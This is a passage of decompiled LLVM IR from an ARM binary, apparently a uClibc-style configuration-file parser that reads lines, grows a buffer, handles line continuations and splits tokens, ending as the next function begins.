  %v2_1692c = load i32, i32* %v1_1692c, align 4
  store i32 %v2_1692c, i32* %r0.global-to-local, align 4
  %v3_1692c = add i32 %v0_16928, 16
  %v4_1692c = inttoptr i32 %v3_1692c to i32*
  %v5_1692c = load i32, i32* %v4_1692c, align 4
  store i32 %v5_1692c, i32* %r2.global-to-local, align 4
  %v3_16934 = inttoptr i32 %v2_1692c to i8*
  %v4_16934 = call i32 @__GI_memset(i8* %v3_16934, i32 0, i32 %v5_1692c)
  store i32 %v4_16934, i32* %r0.global-to-local, align 4
  %v0_16938 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16b58

dec_label_pc_16940:                               ; preds = %dec_label_pc_16908
  %v2_16940 = inttoptr i32 %v1_16928 to i32*
  %v3_16940 = load i32, i32* %v2_16940, align 4
  store i32 %v3_16940, i32* @r4, align 4
  %v1_16944 = load i32, i32* @r6, align 4
  %v2_16944 = add i32 %v1_16944, %v3_16940
  %v3_16944 = inttoptr i32 %v2_16944 to i8*
  store i32 %v2_16944, i32* %r0.global-to-local, align 4
  %v3_16948 = call i32 @strlen(i8* %v3_16944)
  %v0_16950 = load i32, i32* @r6, align 4
  %v2_16950 = add i32 %v0_16950, %v3_16948
  store i32 %v2_16950, i32* @r6, align 4
  %v0_16954 = load i32, i32* @r4, align 4
  store i32 %v0_16954, i32* @r0, align 4
  %v2_16958 = call i32 @__GI_strchr(i32 %v0_16954, i32 10)
  store i32 %v2_16958, i32* %r0.global-to-local, align 4
  %v2_1695c = icmp eq i32 %v2_16958, 0
  store i1 %v2_1695c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1695c, label %dec_label_pc_16988, label %dec_label_pc_16964

dec_label_pc_16964:                               ; preds = %dec_label_pc_16940
  %v1_16964 = inttoptr i32 %v2_16958 to i8*
  %v2_16964 = load i8, i8* %v1_16964, align 1
  %v3_16964 = zext i8 %v2_16964 to i32
  %v1_16968 = add nuw nsw i32 %v3_16964, 255
  %v1_1696c = urem i32 %v1_16968, 256
  store i32 %v1_1696c, i32* %r3.global-to-local, align 4
  %v7_16970 = icmp eq i32 %v1_1696c, 92
  store i1 %v7_16970, i1* %cpsr_z.global-to-local, align 1
  %v1_16974 = trunc i32 %v1_16968 to i8
  store i8 %v1_16974, i8* %v1_16964, align 1
  %v0_16978 = load i32, i32* @r6, align 4
  %v1_16978 = add i32 %v0_16978, -1
  store i32 %v1_16978, i32* @r6, align 4
  %v0_1697c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1697c, label %dec_label_pc_16980, label %dec_label_pc_16a0c

dec_label_pc_16980:                               ; preds = %dec_label_pc_16964
  %v1_16980 = add i32 %v0_16978, -2
  store i32 %v1_16980, i32* @r6, align 4
  br label %dec_label_pc_16908

dec_label_pc_16988:                               ; preds = %dec_label_pc_16940
  %v0_16988 = load i32, i32* @r5, align 4
  %v1_16988 = add i32 %v0_16988, 20
  %v2_16988 = inttoptr i32 %v1_16988 to i32*
  %v3_16988 = load i32, i32* %v2_16988, align 4
  store i32 %v3_16988, i32* %r3.global-to-local, align 4
  %v2_1698c = icmp eq i32 %v3_16988, 0
  store i1 %v2_1698c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1698c, label %dec_label_pc_169c4, label %dec_label_pc_16994

dec_label_pc_16994:                               ; preds = %dec_label_pc_16988
  %v1_16994 = add i32 %v0_16988, 16
  %v2_16994 = inttoptr i32 %v1_16994 to i32*
  %v3_16994 = load i32, i32* %v2_16994, align 4
  store i32 %v3_16994, i32* %r3.global-to-local, align 4
  %v1_16998 = add i32 %v0_16988, 8
  %v2_16998 = inttoptr i32 %v1_16998 to i32*
  %v3_16998 = load i32, i32* %v2_16998, align 4
  %v1_1699c = add i32 %v3_16994, 4096
  store i32 %v1_1699c, i32* %r3.global-to-local, align 4
  %v2_169a0 = add i32 %v3_16998, %v1_1699c
  store i32 %v1_1699c, i32* %v2_16994, align 4
  %v0_169a8 = load i32, i32* @r5, align 4
  %v1_169a8 = add i32 %v0_169a8, 4
  %v2_169a8 = inttoptr i32 %v1_169a8 to i32*
  %v3_169a8 = load i32, i32* %v2_169a8, align 4
  store i32 %v3_169a8, i32* %r0.global-to-local, align 4
  %v4_169ac = inttoptr i32 %v3_169a8 to i32*
  %v5_169ac = call i32 @realloc(i32* %v4_169ac, i32 %v2_169a0, i32 %v2_16918, i32 %v1_1699c)
  store i32 %v5_169ac, i32* %r0.global-to-local, align 4
  %v0_169b0 = load i32, i32* @r5, align 4
  %v1_169b0 = add i32 %v0_169b0, 8
  %v2_169b0 = inttoptr i32 %v1_169b0 to i32*
  %v3_169b0 = load i32, i32* %v2_169b0, align 4
  %v2_169b4 = add i32 %v3_169b0, %v5_169ac
  store i32 %v2_169b4, i32* %r3.global-to-local, align 4
  %v2_169b8 = add i32 %v0_169b0, 12
  %v3_169b8 = inttoptr i32 %v2_169b8 to i32*
  store i32 %v2_169b4, i32* %v3_169b8, align 4
  %v1_169bc = load i32, i32* @r5, align 4
  %v2_169bc = add i32 %v1_169bc, 4
  %v3_169bc = inttoptr i32 %v2_169bc to i32*
  store i32 %v5_169ac, i32* %v3_169bc, align 4
  %v0_16910.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16908

dec_label_pc_169c4:                               ; preds = %dec_label_pc_16988, %.dec_label_pc_169c4_crit_edge
  %v0_169c4 = phi i32 [ %v0_169c4.pre, %.dec_label_pc_169c4_crit_edge ], [ %v0_16988, %dec_label_pc_16988 ]
  %v1_169c4 = inttoptr i32 %v0_169c4 to i32*
  %v2_169c4 = load i32, i32* %v1_169c4, align 4
  store i32 %v2_169c4, i32* @r1, align 4
  %v1_169c8 = add i32 %v2_169c4, 52
  %v2_169c8 = inttoptr i32 %v1_169c8 to i32*
  %v3_169c8 = load i32, i32* %v2_169c8, align 4
  store i32 %v3_169c8, i32* %r3.global-to-local, align 4
  %v2_169cc = icmp eq i32 %v3_169c8, 0
  store i1 %v2_169cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_169cc, label %dec_label_pc_169f8, label %dec_label_pc_169d4

dec_label_pc_169d4:                               ; preds = %dec_label_pc_169c4
  %v1_169d4 = add i32 %v2_169c4, 16
  %v2_169d4 = inttoptr i32 %v1_169d4 to i32*
  %v3_169d4 = load i32, i32* %v2_169d4, align 4
  store i32 %v3_169d4, i32* %r2.global-to-local, align 4
  %v1_169d8 = add i32 %v2_169c4, 24
  %v2_169d8 = inttoptr i32 %v1_169d8 to i32*
  %v3_169d8 = load i32, i32* %v2_169d8, align 4
  store i32 %v3_169d8, i32* %r3.global-to-local, align 4
  %v3_169dc = icmp ult i32 %v3_169d4, %v3_169d8
  %v9_169dc = icmp eq i32 %v3_169d4, %v3_169d8
  store i1 %v9_169dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_169dc, label %dec_label_pc_16a00thread-pre-split, label %dec_label_pc_169ec

dec_label_pc_169ec:                               ; preds = %dec_label_pc_169d4
  store i32 %v2_169c4, i32* %r0.global-to-local, align 4
  %v1_169f0 = inttoptr i32 %v2_169c4 to i16*
  %v2_169f0 = call i32 @getc_unlocked(i16* %v1_169f0)
  store i32 %v2_169f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a00

dec_label_pc_169f8:                               ; preds = %dec_label_pc_169c4
  store i32 %v2_169c4, i32* %r0.global-to-local, align 4
  %v1_169fc = call i32 @__GI_fgetc(i32 %v2_169c4)
  store i32 %v1_169fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a00

dec_label_pc_16a00thread-pre-split:               ; preds = %dec_label_pc_169d4
  %v2_169e0 = inttoptr i32 %v3_169d4 to i8*
  %v3_169e0 = load i8, i8* %v2_169e0, align 1
  %v4_169e0 = zext i8 %v3_169e0 to i32
  store i32 %v4_169e0, i32* %r0.global-to-local, align 4
  %v6_169e0 = add i32 %v3_169d4, 1
  store i32 %v6_169e0, i32* %r2.global-to-local, align 4
  store i32 %v6_169e0, i32* %v2_169d4, align 4
  %v0_16a00.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a00

dec_label_pc_16a00:                               ; preds = %dec_label_pc_16a00thread-pre-split, %dec_label_pc_169ec, %dec_label_pc_169f8
  %v1_16a04 = phi i32 [ %v0_16a00.pr, %dec_label_pc_16a00thread-pre-split ], [ %v2_169f0, %dec_label_pc_169ec ], [ %v1_169fc, %dec_label_pc_169f8 ]
  %v7_16a00 = icmp eq i32 %v1_16a04, 10
  store i1 %v7_16a00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16a00, label %dec_label_pc_16a0c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_16a00
  %v8_16a04 = icmp eq i32 %v1_16a04, -1
  store i1 %v8_16a04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_16a04, label %dec_label_pc_16a0c.loopexit, label %.dec_label_pc_169c4_crit_edge

.dec_label_pc_169c4_crit_edge:                    ; preds = %bb66
  %v0_169c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_169c4

dec_label_pc_16a0c.loopexit:                      ; preds = %bb66, %dec_label_pc_16a00
  %v0_16a0c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16a0c

dec_label_pc_16a0c:                               ; preds = %dec_label_pc_16964, %dec_label_pc_16a0c.loopexit
  %v0_16a0c = phi i32 [ %v0_16a0c.pre, %dec_label_pc_16a0c.loopexit ], [ %v1_16978, %dec_label_pc_16964 ]
  %v7_16a0c = icmp eq i32 %v0_16a0c, -1
  store i1 %v7_16a0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16a0c, label %dec_label_pc_16b54, label %dec_label_pc_16a14

dec_label_pc_16a14:                               ; preds = %dec_label_pc_16a0c
  store i32 %v1_1687c, i32* %r3.global-to-local, align 4
  store i1 %v2_16a18, i1* %cpsr_z.global-to-local, align 1
  %v0_16a1c = load i32, i32* @r5, align 4
  %v1_16a1c = add i32 %v0_16a1c, 12
  %v2_16a1c = inttoptr i32 %v1_16a1c to i32*
  %v3_16a1c = load i32, i32* %v2_16a1c, align 4
  store i32 %v3_16a1c, i32* @r4, align 4
  br i1 %v2_16a18, label %dec_label_pc_16a34, label %dec_label_pc_16a24

dec_label_pc_16a24:                               ; preds = %dec_label_pc_16a14
  store i32 %v3_16a1c, i32* @r0, align 4
  %v0_16a28 = load i32, i32* @sl, align 4
  %v2_16a2c = inttoptr i32 %v3_16a1c to i8*
  %v3_16a2c = call i32 @__GI_strspn(i8* %v2_16a2c, i32 %v0_16a28)
  store i32 %v3_16a2c, i32* %r0.global-to-local, align 4
  %v0_16a30 = load i32, i32* @r4, align 4
  %v2_16a30 = add i32 %v0_16a30, %v3_16a2c
  store i32 %v2_16a30, i32* @r4, align 4
  br label %dec_label_pc_16a34

dec_label_pc_16a34:                               ; preds = %dec_label_pc_16a14, %dec_label_pc_16a24
  %v0_16a34 = phi i32 [ %v3_16a1c, %dec_label_pc_16a14 ], [ %v2_16a30, %dec_label_pc_16a24 ]
  %v1_16a34 = inttoptr i32 %v0_16a34 to i8*
  %v2_16a34 = load i8, i8* %v1_16a34, align 1
  %v3_16a34 = zext i8 %v2_16a34 to i32
  store i32 %v3_16a34, i32* %r2.global-to-local, align 4
  %v2_16a38 = icmp eq i8 %v2_16a34, 0
  store i1 %v2_16a38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a38, label %dec_label_pc_168a4.backedge, label %dec_label_pc_16a40

dec_label_pc_168a4.backedge:                      ; preds = %dec_label_pc_16a34, %dec_label_pc_16a40, %dec_label_pc_16b4c
  %v0_168a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_168a4

dec_label_pc_16a40:                               ; preds = %dec_label_pc_16a34
  %v0_16a40 = load i32, i32* @r7, align 4
  %v1_16a40 = inttoptr i32 %v0_16a40 to i8*
  %v2_16a40 = load i8, i8* %v1_16a40, align 1
  %v3_16a40 = zext i8 %v2_16a40 to i32
  store i32 %v3_16a40, i32* %r3.global-to-local, align 4
  %v9_16a44 = icmp eq i8 %v2_16a40, %v2_16a34
  store i1 %v9_16a44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16a44, label %dec_label_pc_168a4.backedge, label %dec_label_pc_16a4c

dec_label_pc_16a4c:                               ; preds = %dec_label_pc_16a40
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_16a50 = load i32, i32* @r5, align 4
  %v1_16a50 = add i32 %v0_16a50, 4
  %v2_16a50 = inttoptr i32 %v1_16a50 to i32*
  %v3_16a50 = load i32, i32* %v2_16a50, align 4
  store i32 %v3_16a50, i32* %r0.global-to-local, align 4
  %v0_16a54 = load i32, i32* @fp, align 4
  store i32 %v3_16a50, i32* %v1_16a70, align 4
  store i32 %v3_16868, i32* %r2.global-to-local, align 4
  %v3_16a60 = inttoptr i32 %v3_16a50 to i8*
  %v4_16a60 = call i32 @__GI_memset(i8* %v3_16a60, i32 %v0_16a54, i32 %v3_16868)
  store i32 %v4_16a60, i32* %r0.global-to-local, align 4
  %v0_16a64 = load i32, i32* @fp, align 4
  store i32 %v0_16a64, i32* @r6, align 4
  %v0_16b2412 = load i32, i32* @r4, align 4
  %v1_16b2413 = inttoptr i32 %v0_16b2412 to i8*
  %v2_16b2414 = load i8, i8* %v1_16b2413, align 1
  %v3_16b2415 = zext i8 %v2_16b2414 to i32
  store i32 %v3_16b2415, i32* %r2.global-to-local, align 4
  %v2_16b2816 = icmp eq i8 %v2_16b2414, 0
  store i1 %v2_16b2816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b2816, label %dec_label_pc_16b40, label %dec_label_pc_16b30

dec_label_pc_16a6c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_16a70 = load i32, i32* %v1_16a70, align 4
  store i32 %v2_16a70, i32* %r3.global-to-local, align 4
  store i32 %v1_16880, i32* %r2.global-to-local, align 4
  %v9_16a78 = icmp eq i32 %v2_16a7c, %v1_16880
  store i1 %v9_16a78, i1* %cpsr_z.global-to-local, align 1
  %v5_16a7c = mul i32 %v2_16a7c, 4
  %v6_16a7c = add i32 %v2_16a70, %v5_16a7c
  %v7_16a7c = inttoptr i32 %v6_16a7c to i32*
  store i32 %v0_16a7c, i32* %v7_16a7c, align 4
  br i1 %v9_16a78, label %dec_label_pc_16a84, label %dec_label_pc_16a90

dec_label_pc_16a84:                               ; preds = %dec_label_pc_16a6c
  store i32 %v1_1688c, i32* %r3.global-to-local, align 4
  store i1 %v2_16a88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a88, label %dec_label_pc_16a90, label %dec_label_pc_16ab0

dec_label_pc_16a90:                               ; preds = %dec_label_pc_16a84, %dec_label_pc_16a6c
  %v0_16a90 = load i32, i32* @r7, align 4
  %v1_16a90 = inttoptr i32 %v0_16a90 to i8*
  %v2_16a90 = load i8, i8* %v1_16a90, align 1
  %v3_16a90 = zext i8 %v2_16a90 to i32
  store i32 %v3_16a90, i32* %r3.global-to-local, align 4
  %v2_16a94 = icmp eq i8 %v2_16a90, 0
  store i1 %v2_16a94, i1* %cpsr_z.global-to-local, align 1
  %v0_16a98 = load i32, i32* @r4, align 4
  store i32 %v0_16a98, i32* @r0, align 4
  %v1_16a9c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_16a94, i32 %v1_16a9c, i32 %v0_16a90
  store i32 %storemerge, i32* @r1, align 4
  %v0_16aa4 = call i32 @strcspn()
  store i32 %v0_16aa4, i32* %r0.global-to-local, align 4
  %v0_16aa8 = load i32, i32* @r4, align 4
  %v2_16aa8 = add i32 %v0_16aa8, %v0_16aa4
  store i32 %v2_16aa8, i32* @r4, align 4
  br label %dec_label_pc_16ae8

dec_label_pc_16ab0:                               ; preds = %dec_label_pc_16a84
  %v0_16ab0 = load i32, i32* @r4, align 4
  store i32 %v0_16ab0, i32* @r0, align 4
  %v0_16ab4 = load i32, i32* @r7, align 4
  %v1_16ab4 = inttoptr i32 %v0_16ab4 to i8*
  %v2_16ab4 = load i8, i8* %v1_16ab4, align 1
  %v3_16ab4 = zext i8 %v2_16ab4 to i32
  %v5_16ab8 = call i32 @__GI_strchrnul(i32 %v0_16ab0, i32 %v3_16ab4, i32 %v1_16880, i32 %v1_1688c)
  store i32 %v5_16ab8, i32* %r0.global-to-local, align 4
  store i32 %v1_1687c, i32* %r2.global-to-local, align 4
  store i1 %v2_16a18, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_16ab8, i32* @r4, align 4
  br i1 %v2_16a18, label %dec_label_pc_16ae8, label %dec_label_pc_16ad4

dec_label_pc_16ad0:                               ; preds = %dec_label_pc_16ad4
  %v1_16ad0 = add i32 %v0_16ae8.pre, -1
  store i32 %v1_16ad0, i32* @r4, align 4
  br label %dec_label_pc_16ad4

dec_label_pc_16ad4:                               ; preds = %dec_label_pc_16ab0, %dec_label_pc_16ad0
  %v0_16ad4 = phi i32 [ %v1_16ad0, %dec_label_pc_16ad0 ], [ %v5_16ab8, %dec_label_pc_16ab0 ]
  %v1_16ad4 = add i32 %v0_16ad4, -1
  %v2_16ad4 = inttoptr i32 %v1_16ad4 to i8*
  %v3_16ad4 = load i8, i8* %v2_16ad4, align 1
  %v4_16ad4 = zext i8 %v3_16ad4 to i32
  %v0_16ad8 = load i32, i32* @sl, align 4
  store i32 %v0_16ad8, i32* @r0, align 4
  %v2_16adc = call i32 @__GI_strchr(i32 %v0_16ad8, i32 %v4_16ad4)
  store i32 %v2_16adc, i32* %r0.global-to-local, align 4
  %v2_16ae0 = icmp eq i32 %v2_16adc, 0
  store i1 %v2_16ae0, i1* %cpsr_z.global-to-local, align 1
  %v0_16ae8.pre = load i32, i32* @r4, align 4
  br i1 %v2_16ae0, label %dec_label_pc_16ae8, label %dec_label_pc_16ad0

dec_label_pc_16ae8:                               ; preds = %dec_label_pc_16ad4, %dec_label_pc_16ab0, %dec_label_pc_16a90
  %v3_16af4 = phi i32 [ %v5_16ab8, %dec_label_pc_16ab0 ], [ %v2_16aa8, %dec_label_pc_16a90 ], [ %v0_16ae8.pre, %dec_label_pc_16ad4 ]
  %v1_16ae8 = inttoptr i32 %v3_16af4 to i8*
  %v2_16ae8 = load i8, i8* %v1_16ae8, align 1
  %v3_16ae8 = zext i8 %v2_16ae8 to i32
  store i32 %v3_16ae8, i32* %r2.global-to-local, align 4
  %v0_16aec = load i32, i32* @r7, align 4
  %v1_16aec = inttoptr i32 %v0_16aec to i8*
  %v2_16aec = load i8, i8* %v1_16aec, align 1
  %v3_16aec = zext i8 %v2_16aec to i32
  store i32 %v3_16aec, i32* %r3.global-to-local, align 4
  %v9_16af0 = icmp eq i8 %v2_16aec, %v2_16ae8
  store i1 %v9_16af0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16af0, label %bb69, label %dec_label_pc_16afc

bb69:                                             ; preds = %dec_label_pc_16ae8
  %v1_16af4 = load i32, i32* @fp, align 4
  %v2_16af4 = trunc i32 %v1_16af4 to i8
  store i8 %v2_16af4, i8* %v1_16ae8, align 1
  %v0_16af8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16af8.pr, label %bb71, label %.dec_label_pc_16afc_crit_edge

.dec_label_pc_16afc_crit_edge:                    ; preds = %bb69
  %v0_16afc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16afc

dec_label_pc_16afc:                               ; preds = %.dec_label_pc_16afc_crit_edge, %dec_label_pc_16ae8
  %v0_16afc = phi i32 [ %v0_16afc.pre, %.dec_label_pc_16afc_crit_edge ], [ %v3_16ae8, %dec_label_pc_16ae8 ]
  %v2_16afc = icmp eq i32 %v0_16afc, 0
  store i1 %v2_16afc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16afc, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_16afc
  %v1_16b00 = load i32, i32* @fp, align 4
  %v2_16b00 = trunc i32 %v1_16b00 to i8
  %v3_16b00 = load i32, i32* @r4, align 4
  %v4_16b00 = inttoptr i32 %v3_16b00 to i8*
  store i8 %v2_16b00, i8* %v4_16b00, align 1
  %v5_16b00 = load i32, i32* @r4, align 4
  %v6_16b00 = add i32 %v5_16b00, 1
  store i32 %v6_16b00, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_16afc, %bb70
  %v2_16b04 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_16b04, i32* %r3.global-to-local, align 4
  %v2_16b08 = icmp eq i32 %v2_16b04, 0
  store i1 %v2_16b08, i1* %cpsr_z.global-to-local, align 1
  %v0_16b24.pre = load i32, i32* @r4, align 4
  br i1 %v2_16b08, label %dec_label_pc_16b20, label %dec_label_pc_16b10

dec_label_pc_16b10:                               ; preds = %bb71
  store i32 %v0_16b24.pre, i32* @r0, align 4
  %v0_16b14 = load i32, i32* @sl, align 4
  %v2_16b18 = inttoptr i32 %v0_16b24.pre to i8*
  %v3_16b18 = call i32 @__GI_strspn(i8* %v2_16b18, i32 %v0_16b14)
  store i32 %v3_16b18, i32* %r0.global-to-local, align 4
  %v0_16b1c = load i32, i32* @r4, align 4
  %v2_16b1c = add i32 %v0_16b1c, %v3_16b18
  store i32 %v2_16b1c, i32* @r4, align 4
  br label %dec_label_pc_16b20

dec_label_pc_16b20:                               ; preds = %bb71, %dec_label_pc_16b10
  %v0_16b24 = phi i32 [ %v2_16b1c, %dec_label_pc_16b10 ], [ %v0_16b24.pre, %bb71 ]
  %v0_16b20 = load i32, i32* @r6, align 4
  %v1_16b20 = add i32 %v0_16b20, 1
  store i32 %v1_16b20, i32* @r6, align 4
  %v1_16b24 = inttoptr i32 %v0_16b24 to i8*
  %v2_16b24 = load i8, i8* %v1_16b24, align 1
  %v3_16b24 = zext i8 %v2_16b24 to i32
  store i32 %v3_16b24, i32* %r2.global-to-local, align 4
  %v2_16b28 = icmp eq i8 %v2_16b24, 0
  store i1 %v2_16b28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b28, label %dec_label_pc_16b40, label %dec_label_pc_16b30

dec_label_pc_16b30:                               ; preds = %dec_label_pc_16a4c, %dec_label_pc_16b20
  %v0_16a7c = phi i32 [ %v0_16b24, %dec_label_pc_16b20 ], [ %v0_16b2412, %dec_label_pc_16a4c ]
  %v2_16a7c = phi i32 [ %v1_16b20, %dec_label_pc_16b20 ], [ %v0_16a64, %dec_label_pc_16a4c ]
  %v1_16b34 = phi i32 [ %v3_16b24, %dec_label_pc_16b20 ], [ %v3_16b2415, %dec_label_pc_16a4c ]
  %v0_16b30 = load i32, i32* @r7, align 4
  %v1_16b30 = inttoptr i32 %v0_16b30 to i8*
  %v2_16b30 = load i8, i8* %v1_16b30, align 1
  %v3_16b30 = zext i8 %v2_16b30 to i32
  store i32 %v3_16b30, i32* %r3.global-to-local, align 4
  %v9_16b34 = icmp eq i32 %v3_16b30, %v1_16b34
  store i1 %v9_16b34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16b34, label %dec_label_pc_16b40, label %bb72

bb72:                                             ; preds = %dec_label_pc_16b30
  %v2_16b38 = load i32, i32* @sb, align 4
  %v3_16b38 = sub i32 %v2_16a7c, %v2_16b38
  %v5_16b38 = xor i32 %v2_16b38, %v2_16a7c
  %v6_16b38 = xor i32 %v3_16b38, %v2_16a7c
  %v7_16b38 = and i32 %v6_16b38, %v5_16b38
  %v8_16b38 = icmp slt i32 %v7_16b38, 0
  %v9_16b38 = icmp slt i32 %v3_16b38, 0
  %v10_16b38 = icmp eq i32 %v2_16a7c, %v2_16b38
  store i1 %v10_16b38, i1* %cpsr_z.global-to-local, align 1
  %v2_16b3c = xor i1 %v9_16b38, %v8_16b38
  br i1 %v2_16b3c, label %dec_label_pc_16a6c, label %dec_label_pc_16b40

dec_label_pc_16b40:                               ; preds = %dec_label_pc_16b30, %dec_label_pc_16b20, %bb72, %dec_label_pc_16a4c
  %v0_16b44 = phi i32 [ %v0_16a64, %dec_label_pc_16a4c ], [ %v2_16a7c, %dec_label_pc_16b30 ], [ %v1_16b20, %dec_label_pc_16b20 ], [ %v2_16a7c, %bb72 ]
  store i32 %v3_16864, i32* %r2.global-to-local, align 4
  %v9_16b44 = icmp eq i32 %v0_16b44, %v3_16864
  store i1 %v9_16b44, i1* %cpsr_z.global-to-local, align 1
  %v6_16b48 = icmp slt i32 %v0_16b44, %v3_16864
  br i1 %v6_16b48, label %dec_label_pc_16b4c, label %dec_label_pc_16b58

dec_label_pc_16b4c:                               ; preds = %dec_label_pc_16b40
  %v0_16b4c = load i32, i32* @r8, align 4
  %v1_16b4c = and i32 %v0_16b4c, 1048576
  %v2_16b4c = icmp eq i32 %v1_16b4c, 0
  store i1 %v2_16b4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b4c, label %dec_label_pc_168a4.backedge, label %dec_label_pc_16b54

dec_label_pc_16b54:                               ; preds = %dec_label_pc_16b4c, %dec_label_pc_16a0c, %.thread, %entry
  br label %dec_label_pc_16b58

dec_label_pc_16b58:                               ; preds = %dec_label_pc_16b40, %dec_label_pc_16928, %dec_label_pc_16b54
  %v0_16b58 = phi i32 [ %v0_16938, %dec_label_pc_16928 ], [ 0, %dec_label_pc_16b54 ], [ %v0_16b44, %dec_label_pc_16b40 ]
  store i32 %v0_16b58, i32* %r0.global-to-local, align 4
  store i32 %v3_16840, i32* @r4, align 4
  store i32 %v6_16840, i32* @r5, align 4
  store i32 %v9_16840, i32* @r6, align 4
  store i32 %v12_16840, i32* @r7, align 4
  store i32 %v15_16840, i32* @r8, align 4
  store i32 %v18_16840, i32* @sb, align 4
  store i32 %v21_16840, i32* @sl, align 4
  store i32 %v24_16840, i32* @fp, align 4
  ret i32 %v0_16b58

; uselistorder directives
  uselistorder i32 %v0_16b58, { 1, 0 }
  uselistorder i32 %v0_16b44, { 0, 2, 1 }
  uselistorder i32 %v3_16b38, { 1, 0 }
  uselistorder i32 %v2_16b38, { 1, 0, 2 }
  uselistorder i32 %v2_16a7c, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_16b24.pre, { 0, 2, 1 }
  uselistorder i32 %v5_16ab8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16a64, { 1, 0, 2 }
  uselistorder i1 %v9_16a44, { 1, 0 }
  uselistorder i32 %v3_16a1c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_16a0c, { 1, 0 }
  uselistorder i1 %v8_16a04, { 1, 0 }
  uselistorder i32 %v3_169d4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_169c4, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_169ac, { 1, 0, 2 }
  uselistorder i32 %v1_1699c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16988, { 0, 2, 1, 3 }
  uselistorder i32 %v1_16980, { 1, 0 }
  uselistorder i32 %v1_1696c, { 1, 0 }
  uselistorder i32 %v1_16968, { 1, 0 }
  uselistorder i32 %v2_16944, { 1, 0 }
  uselistorder i32 %v1_16928, { 2, 0, 1 }
  uselistorder i32 %v0_16910, { 1, 0 }
  uselistorder i32 %v1_16900, { 0, 2, 1 }
  uselistorder i32* %v1_16a70, { 1, 0 }
  uselistorder i1 %v2_16a18, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1688c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_16880, { 2, 1, 0 }
  uselistorder i32 %v3_16868, { 1, 2, 0 }
  uselistorder i32 %v3_16864, { 2, 1, 0 }
  uselistorder i32 %v1_1685c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 0, 1, 10, 11, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_16b58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16b40, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16b30, { 1, 0 }
  uselistorder label %dec_label_pc_16b20, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ad4, { 1, 0 }
  uselistorder label %dec_label_pc_168a4.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a34, { 1, 0 }
  uselistorder label %dec_label_pc_16a0c, { 1, 0 }
  uselistorder label %dec_label_pc_16a00, { 0, 2, 1 }
  uselistorder label %dec_label_pc_169c4, { 1, 0 }
  uselistorder label %dec_label_pc_168f8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
